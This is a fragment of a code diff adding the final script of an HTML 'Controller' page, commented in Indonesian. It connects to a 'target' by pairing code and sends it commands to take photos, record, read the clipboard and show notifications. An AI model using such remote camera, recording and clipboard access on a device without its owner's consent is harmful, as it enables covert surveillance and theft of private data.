+    const msg = prompt('✏️ Masukkan pesan notifikasi:', 'Halo dari Controller!');
+    if (msg) sendCommand('notification', { message: msg });
+  };
+  btns.foto.onclick = () => sendCommand('take_photo');
+  btns.rekam.onclick = () => sendCommand('start_record');
+  btns.stopRekam.onclick = () => sendCommand('stop_record');
+  btns.clipboard.onclick = () => sendCommand('read_clipboard');
+  
+  connectBtn.onclick = () => {
+    const peerId = peerIdInput.value.trim();
+    if (!peerId) {
+      addResult('error', { error: 'Masukkan kode pairing target' }, true);
+      return;
+    }
+    connectToPeer(peerId);
+  };
+  
+  // Minta izin notifikasi di controller juga
+  if ('Notification' in window) Notification.requestPermission();
+  
+  initPeer();
 </script>
 </body>
 </html>
